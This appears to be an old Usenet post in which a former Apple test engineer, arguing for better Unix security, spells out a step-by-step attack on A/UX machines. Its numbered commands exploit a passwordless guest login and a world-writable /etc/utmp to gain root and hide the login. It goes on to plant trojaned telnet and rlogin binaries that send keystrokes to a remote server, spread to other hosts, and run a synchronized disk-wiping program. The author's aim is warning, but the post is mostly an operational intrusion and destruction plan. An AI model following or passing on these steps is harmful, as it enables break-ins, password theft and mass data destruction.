I write:

&gt; You don't need to have a firewall to tighten up the security on your
&gt; machine.  Read this book if you're going to put a Unix box of any sort on
&gt; the Internet, or you might wake up some day to find someone's erased your
&gt; hard disk from the other side of the globe.

&gt; Matt Bartley &lt;mbartley@I guess this is wrong.edu&gt; writes

&gt; Is it that dangerous?  I wonder how machines in college, which didn't
&gt; have firewall protection that I know of, survived.  Then again, that
&gt; was close to 3 years ago - maybe things are worse now.

Before I proceed, let me point out that the following procedure has been
documented for more than five years.  Some may regards it as irresponsible
to publish this information, but I consider it a greater danger that many
Unix machine owners fail to appreciate the seriousness of this problem.

How to erase the hard disk of almost every Unix machine on the Internet:

Apple's A/UX 2.0 was, at least initially, shipped with two well-known
security holes, holes which had been documented for years in the CERT
advisories.  When I was the MacTCP test engineer at Apple, I beta tested
A/UX, found these holes, and tried very hard to get Apple to close them
before shipping the product, which was primarily meant as Apple's candidate
for an $80 million Air Force contract.  I found this pretty ironic, but
when I griped about it at Apple - and I griped about it increasingly loudly
as the ship date approached - all I got was sternly scolded.

Apple's internal netadmins did invite to play "capture /flag" on their
internal net Unix machines, which was fun.  I never could break into /flag.

Security hole #1: A/UX ships with the guest login enabled, with no
password.  Thus anyone can log in to any A/UX machine on the Internet.

Security hole #2: A/UX was largely derived from SunOS, and shared a hole
with older versions of SunOS.  The /etc/utmp file is world writable.  The
reason this is done is so that shell windows in the MacOS process on A/UX,
or under SunView on the Sun, can appear to be logged in terminals, I think
mainly to allow "wall" to write messages to all the windows.

This is a deadly error.  If /etc/utmp is world writable, anyone who can log
in, with a little practice, can become root and cover evidence of their
login in about 30 seconds.

This is done as follows:

0. Using HINFO records from the name service, and looking at the SMTP,
   FTP, and login banners of many machines on the Internet, collect the
   addresses of many A/UX machines.  For each A/UX machine do 1 - 15:

1. On your local machine, running the window system of your choice, type
    in a no-password passwd file entry for root into a window.  Leave the
    window open.

2. On your local machine, create a file in utmp format in which ../tmp/foo
   is the only logged in terminal.  Copy it to the clipboard (this will be
   a binary file - you have to write a small C program to create it).

3. Log in as guest over the internet.

4. cat /etc/utmp | od -h

5  cp /etc/passwd /tmp/Ex12345

6. cat &gt; /etc/utmp

7. Paste the contents of your clipboard into the terminal window and press
   control-D.  Now you've made /dev/../tmp/foo the only terminal which
   appears to be logged in.

8. ln -s /etc/passwd /tmp/foo

9. rwall "root::0:0::/:/bin/sh".  This message is broadcast to all logged
   in terminals, thus replacing the password file with your own.

10. su ... now you are root.  Time to cover your tracks!

11. mv /tmp/Ex12345 /etc/passwd

12. Copy the hex dump that just scrolled by on your screen to the
    clipboard.  Paste it into a program that you have written that
    converts it back into binary, removes all the guest login records
    from it, and places the result back on the clipboard.

13. cat &gt; /etc/utmp ... paste into the terminal window and press ^D.

14. Relax.  Take a break and look upon your handiwork.  The only
    evidence of your connection is the existence of a couple of shell
    processes and a telnet or rlogin daemon.  "who" or "users" will not
    show you; the machine's users will have to examine ps listings very
    carefully to see that you are logged in.

15. When you've sufficiently regained your composure, use ftp to fetch
    patched telnet and rlogin binaries from your machine.  With telnet
    you could just set the debug flag to dribble all the user's keystrokes
    into a file, but it would have more finesse to send a UDP packet of
    the first few keystrokes of each session to a server you have somewhere
    on the internet.

16. Collect passwords to every machine that allows logins from the machine
    you have just hacked.  If you get any root passwords, go to step 15.
    (be sure to collect enough keystrokes to catch any su's that are done
    after logging in as a regular use.  If the passwords are to any other
    A/UX machines, or old SunOS machines, go to step 4.

17. After you have collected lots of root passwords, right a C program
    that will wait for a certain delay, then turn off all networking
    using ifconfig (to prevent the admin from getting in and stopping
    the damage), mmap the raw partitions of all the mounted hard disks,
    make sure that the whole program is sitting in physical ram, then
    write garbage into the mmap'ed memory blocks.  Install this program
    on all your target machines, with the delay synchronized to each
    system's own clock so that the damage happens simultaneously worldwide.

You will probably want to distribute installation programs to a few dozen
of your hacked machines, and have them all install on the machines nearby,
to prevent word from getting out before the installations are all complete.

If you're lucky, you can get the passwords to some backbone routers and
partition the internet to help prevent the spread of the warning.

The reason your college's machines have not been hacked yet, is because
there are many machines on the internet, and the hackers have not got
around to it yet.

Read Firewalls and Internet Security, by William R. Cheswick and Steven M.
Bellovin, ISBN 0-201-63357-4, before this happens to you.  Any machine that
allows logins from your own machine will be compromised, if your machine is
compromised.  Every machine that allows logins from any machine that allows
logins from you will then be compromised, and so on.  If the security is
not tightened up considerably on the hosts connected to the Internet,
someone's going to do something like this and bring the whole thing down.
The Morris Worm did a great deal of damage to the net, but did little in
the way of monetary damage beyond wasted employee time.  Something like
this would do damage in the billions of dollars.
